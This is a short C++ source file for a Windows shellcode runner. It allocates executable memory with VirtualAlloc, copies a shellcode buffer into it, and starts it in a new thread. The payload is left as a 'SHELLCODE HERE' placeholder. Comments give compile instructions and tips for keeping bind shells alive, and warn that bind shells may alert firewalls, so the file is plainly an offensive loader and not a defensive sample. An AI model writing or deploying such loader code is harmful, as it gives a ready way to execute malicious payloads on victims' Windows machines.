#include <windows.h>
#include <iostream>
#include <stdlib.h>
#include <stdio.h>

// Compile: cl.exe windows_shellcode_runner.cpp -o runner.exe
// Tested in Windows 11 with Visual Studio Community 2022

int main() {
    char shellcode[] = {
        "SHELLCODE HERE"
    };
    int shellcode_size = sizeof(shellcode);
    LPVOID exec_mem;

    exec_mem = VirtualAlloc(
        0,
        shellcode_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
        );

    RtlMoveMemory(exec_mem, shellcode, shellcode_size);
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
    Sleep(1000); // For bind shells you might want to add more time
    //  Sleep(5000000); bind shell example (NOTE BIND SHELLS ARE NOISY, IT MAY ALERT FIREWALLS)
    return 0;
    //((void(*)())exec)();
}